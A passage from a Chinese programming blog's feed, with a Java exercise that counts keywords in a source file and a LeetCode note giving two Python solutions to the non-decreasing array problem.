class="keyword">new</span> StringTokenizer(s[i],<span class="string">",.;:-\" "</span>);</span><br><span class="line"><span class="keyword">while</span>(st.hasMoreTokens())&#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">key</span>=st.nextToken();</span><br><span class="line"><span class="keyword">if</span>(statistics.<span class="built_in">get</span>(<span class="built_in">key</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">statistics.put(<span class="built_in">key</span>, statistics.<span class="built_in">get</span>(<span class="built_in">key</span>)+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">else</span> </span><br><span class="line">statistics.put(<span class="built_in">key</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.<span class="built_in">println</span>(statistics);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>代码<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> class homework5_7 &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="string">"public,abstract,assert,boolean,break,byte,case,catch,char,class,continue,default,do,double,else,enum,extends,final,finally,float,for,if,implements,import,int,interface,instanceof,long,native,new,package,private,protected,return,short,static,strictfp,super,switch,synchronized,this,throw,throws,transient,try,void,volatile,while"</span>;</span><br><span class="line">        Set &lt;<span class="keyword">String</span>&gt;actionSet = <span class="keyword">new</span> HashSet&lt;&gt;(Arrays.asList(<span class="built_in">str</span>.<span class="built_in">split</span>(<span class="string">","</span>)));</span><br><span class="line">        Map &lt;<span class="keyword">String</span>,Integer&gt;keywords  = <span class="keyword">new</span> <span class="keyword">HashMap</span>&lt;<span class="keyword">String</span>,Integer&gt;();</span><br><span class="line">        System.out.<span class="built_in">print</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">String</span> s = <span class="string">""</span>;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"TestMap.java"</span>);</span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            <span class="built_in">int</span> content;</span><br><span class="line">            <span class="keyword">while</span> ((content = fis.read()) != <span class="number">-1</span>) &#123;</span><br><span class="line">                s += (<span class="built_in">char</span>)content;</span><br><span class="line">            &#125;</span><br><span class="line">            StringTokenizer st = <span class="keyword">new</span> StringTokenizer(s,<span class="string">",; ()&#123;&#125;.="</span>);</span><br><span class="line">            <span class="keyword">while</span>(st.hasMoreTokens())&#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">key</span>=st.nextToken();     </span><br><span class="line"><span class="keyword">if</span>(actionSet.contains(<span class="built_in">key</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(keywords.<span class="built_in">get</span>(<span class="built_in">key</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">keywords.put(<span class="built_in">key</span>, keywords.<span class="built_in">get</span>(<span class="built_in">key</span>)+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">keywords.put(<span class="built_in">key</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.<span class="built_in">println</span>(keywords);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (fis != <span class="keyword">null</span>)</span><br><span class="line">                    fis.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>运行结果<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attribute">new</span>=3, <span class="attribute">static</span>=3, <span class="attribute">void</span>=1, <span class="attribute">import</span>=1, <span class="attribute">public</span>=2, <span class="attribute">this</span>=1, <span class="attribute">for</span>=1, <span class="attribute">while</span>=1, <span class="attribute">class</span>=1, <span class="attribute">if</span>=2, <span class="attribute">int</span>=1&#125;</span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Java-容器学习&quot;&gt;&lt;a href=&quot;#Java-容器学习&quot; class=&quot;headerlink&quot; title=&quot;Java 容器学习&quot;&gt;&lt;/a&gt;Java 容器学习&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;容器，就是一种Java中的可以容纳各种对象的数据结构，容器可以储存各种对象：例如String、int都可以，如果不确定要让容器接受哪一种对象，可以使用泛型来替代。但是如果使用泛型，如果往容器里存Integer、String两种甚至更多种不同的对象，虽然编译器不会报错，但是会报出有安全问题警告，所以尽量还是直接指定存储哪一种对象，而非使用泛型。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="开发相关" scheme="/categories/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="Java学习" scheme="/tags/Java%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="容器基础" scheme="/tags/%E5%AE%B9%E5%99%A8%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>非递减数列</title>
    <link href="/2019/10/23/%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/"/>
    <id>/2019/10/23/非递减数列/</id>
    <published>2019-10-23T15:20:43.000Z</published>
    <updated>2019-11-12T03:42:54.399Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LeetCode刷题笔记"><a href="#LeetCode刷题笔记" class="headerlink" title="LeetCode刷题笔记"></a>LeetCode刷题笔记</h2><h3 id="非递减数列"><a href="#非递减数列" class="headerlink" title="非递减数列"></a>非递减数列</h3><p><strong>题目链接：<a href="https://leetcode-cn.com/problems/non-decreasing-array/submissions/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/non-decreasing-array/submissions/</a></strong></p><hr><blockquote><p>给定一个长度为 n 的整数数组，你的任务是判断在最多改变 1 个元素的情况下，该数组能否变成一个非递减数列。</p></blockquote><p>我们是这样定义一个非递减数列的： 对于数组中所有的 i (1 &lt;= i &lt; n)，满足 array[i] &lt;= array[i + 1]。</p><a id="more"></a><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">示例 1:</span><br><span class="line"><span class="section">输入: [4,2,3]</span></span><br><span class="line"><span class="section">输出: True</span></span><br><span class="line"><span class="section">解释: 你可以通过把第一个4变成1来使得它成为一个非递减数列。</span></span><br><span class="line">示例 2:</span><br><span class="line"><span class="section">输入: [4,2,1]</span></span><br><span class="line"><span class="section">输出: False</span></span><br><span class="line"><span class="section">解释: 你不能在只改变一个元素的情况下将其变为非递减数列。</span></span><br><span class="line"><span class="section">说明:  n 的范围为 [1, 10,000]。</span></span><br></pre></td></tr></table></figure><hr><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><blockquote><p>写这个题的时候脑子昏昏沉沉的，写了半天总是不对，看了下大佬的思路，然后就思路清晰~<br>此题只能改变一次，所以建立一个flag保存改变次数，如果改变次数大于1，直接return False<br>发现nums[i] &gt; nums[i+1]时有两种选择使它变成非递减数列</p><ol><li>nums[i]   = nums[i+1]</li><li>nums[i+1] = nums[i]<br>第一种情况时需要考虑将nums[i] = nums[i+1]后，因为已经判断过nums[i] &gt;= nums[i-1]成立，而nums[i] = nums[i+1]语句运行后，nums[i]变小了，需要再次判断是否nums[i] &gt;= nums[i-1],如果nums[i] &lt; nums[i-1]，则进入第二种情况。<br>第二种情况将nums[i+1] = nums[i]并没有什么特别之处，因为循环是往后运行的，可以检查出是否会有问题</li></ol></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>超出时间限制</td><td>240 ms</td><td>15.1 MB</td><td>Python3</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkPossibility</span><span class="params">(self, nums: List[int])</span> -&gt; bool:</span></span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        tmp  = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;nums[i+<span class="number">1</span>]):</span><br><span class="line">                flag -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(flag&lt;<span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">                k = nums[i]</span><br><span class="line">                <span class="comment">#将nums[i]的值改为nums[i+1]的值</span></span><br><span class="line">                nums[i] = nums[i+<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span>(nums[i]&lt;nums[i<span class="number">-1</span>] <span class="keyword">and</span> i&gt;=<span class="number">1</span>):</span><br><span class="line">                    nums[i] = k</span><br><span class="line">                <span class="comment">#将nums[i+1]的值改为nums[i]的值</span></span><br><span class="line">                    nums[i+<span class="number">1</span>] = nums[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><hr><blockquote><p>这个题题解数目较少，python3解法大同小异，找到另一个题解，思路和我的一样，不过写的更清晰</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>超出时间限制</td><td>236 ms</td><td>15.1 MB</td><td>Python3</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkPossibility</span><span class="params">(self, nums: List[int])</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; nums[i+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">                    nums[<span class="number">0</span>]=nums[<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">elif</span> nums[i<span class="number">-1</span>]&gt;nums[i+<span class="number">1</span>]:</span><br><span class="line">                    nums[i+<span class="number">1</span>]=nums[i]</span><br><span class="line">                <span class="keyword">elif</span> nums[i<span class="number">-1</span>]&lt;nums[i+<span class="number">1</span>]:</span><br><span class="line">                    nums[i]=nums[i<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; nums[i+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;LeetCode刷题笔记&quot;&gt;&lt;a href=&quot;#LeetCode刷题笔记&quot; class=&quot;headerlink&quot; title=&quot;LeetCode刷题笔记&quot;&gt;&lt;/a&gt;LeetCode刷题笔记&lt;/h2&gt;&lt;h3 id=&quot;非递减数列&quot;&gt;&lt;a href=&quot;#非递减数列&quot; class=&quot;headerlink&quot; title=&quot;非递减数列&quot;&gt;&lt;/a&gt;非递减数列&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;题目链接：&lt;a href=&quot;https://leetcode-cn.com/problems/non-decreasing-array/submissions/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://leetcode-cn.com/problems/non-decreasing-array/submissions/&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;给定一个长度为 n 的整数数组，你的任务是判断在最多改变 1 个元素的情况下，该数组能否变成一个非递减数列。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们是这样定义一个非递减数列的： 对于数组中所有的 i (1 &amp;lt;= i &amp;lt; n)，满足 array[i] &amp;lt;= array[i + 1]。&lt;/p&gt;
    
    </summary>
    
    
      <category term="LeetCode刷题笔记" scheme="/categories/LeetCode%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="非递减数列" scheme="/tags/%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/"/>
    
  </entry>
  
</feed>
